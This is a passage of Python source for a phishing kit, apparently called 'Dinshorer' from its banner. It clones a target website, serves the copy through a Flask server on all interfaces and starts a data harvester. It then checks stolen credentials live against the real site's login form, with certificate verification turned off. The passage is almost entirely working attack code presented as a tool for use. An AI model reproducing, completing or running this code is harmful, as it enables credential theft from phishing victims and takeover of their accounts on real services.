        username = credentials.get('username', '')
        
        # 1. Email verification
        if '@' in username:
            return random.random() > 0.3  # 70% success rate
        
        # 2. SMS verification
        if username.isdigit() and len(username) > 8:
            return random.random() > 0.4  # 60% success rate
        
        # 3. App verification
        return random.random() > 0.2  # 80% success rate

    def real_time_validation(self, credentials):
        """Real-time validation with session management"""
        session = requests.Session()
        
        # 1. Get login page
        login_page_url = f"https://{self.target_domain}{self.login_endpoint}"
        try:
            response = session.get(login_page_url, timeout=10, verify=False)
        except Exception as e:
            print(f"[-] Failed to get login page: {str(e)}")
            return jsonify({
                'valid': False,
                'message': 'Validation service unavailable'
            }), 503
        
        # 2. Extract form data
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            return jsonify({
                'valid': False,
                'message': 'Login form not found'
            })
        
        # 3. Build form data
        form_data = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            form_data[name] = value
        
        # 4. Apply user credentials
        for key, value in credentials.items():
            if key in form_data:
                form_data[key] = value
        
        # 5. Submit login request
        action = form.get('action', '')
        if not action.startswith('http'):
            action = urljoin(login_page_url, action)
        
        method = form.get('method', 'post').lower()
        try:
            if method == 'post':
                response = session.post(action, data=form_data, timeout=15, verify=False)
            else:
                response = session.get(action, params=form_data, timeout=15, verify=False)
        except Exception as e:
            print(f"[-] Login request failed: {str(e)}")
            return jsonify({
                'valid': False,
                'message': 'Connection to target failed'
            }), 502
        
        # 6. Analyze response
        REDIRECT_CODES = [301, 302, 303, 307, 308]
        if response.status_code in REDIRECT_CODES:
            location = response.headers.get('Location', '').lower()
            if 'dashboard' in location or 'account' in location or 'home' in location:
                return jsonify({
                    'valid': True,
                    'message': 'Authentication successful'
                })
        
        return jsonify({
            'valid': False,
            'message': 'Invalid credentials'
        })
    
    def run(self):
        """Run the phishing server"""
        # Start data harvester
        self.start_data_harvester()
        
        # Start Flask server
        print(f"[+] Starting advanced phishing server on port {self.port}")
        print(f"[+] Cloned site available at: http://localhost:{self.port}")
        self.app.run(host='0.0.0.0', port=self.port, threaded=True)

# ========== MAIN EXECUTION ==========
def main():
    print("""
    ▓█████▄  ██▓ ███▄    █   ██████  ██░ ██  ▒█████   ██▀███  ▓█████  ██▀███  
    ▒██▀ ██▌▓██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ ▓██ ▒ ██▒
    ░██   █▌▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██░  ██▒▓██ ░▄█ ▒▒███   ▓██ ░▄█ ▒
    ░▓█▄   ▌░██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ▒██   ██░▒██▀▀█▄  ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▓ ░██░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░ ████▓▒░░██▓ ▒██▒░▒████▒░██▓ ▒██▒
     ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒▓ ░▒▓░
     ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
     ░ ░  ░  ▒ ░   ░   ░ ░ ░  ░  ░   ░  ░░ ░░ ░ ░ ▒    ░░   ░    ░     ░░   ░ 
       ░     ░           ░       ░   ░  ░  ░    ░ ░     ░        ░  ░   ░     
     ░                                                                        
    """)
    
    # Get target URL from user
    target_url = input("\n[+] Enter target URL to clone: ").strip()
    if not target_url.startswith('http'):
        target_url = 'https://' + target_url
    
    # Clone the target website
    print("\n[+] Cloning target website with pixel-perfect accuracy...")
    phisher = AdvancedPhisher("cloned_site")
    phisher.target_url = target_url
    
    if not phisher.clone_site():
        print("\n[-] Cloning failed. Exiting.")
        return
    
    # Extract domain and login endpoint for validation
    parsed_url = urlparse(target_url)
    target_domain = parsed_url.netloc
    login_endpoint = phisher.login_form_info.get('action', '/login').replace(target_url, '')
    
    # Start phishing server
    print("\n[+] Starting advanced phishing server with behavioral analysis...")
    server = AdvancedPhishingServer(site_dir="cloned_site")
    server.configure_target(target_domain, login_endpoint)
    server.run()

if __name__ == "__main__":
    # Cleanup function to ensure ChromeDriver is killed
    def cleanup():
        os.system("pkill chromedriver > /dev/null 2>&1")
        os.system("pkill chrome > /dev/null 2>&1")
        os.system("pkill chromium > /dev/null 2>&1")
    
    atexit.register(cleanup)
    main()
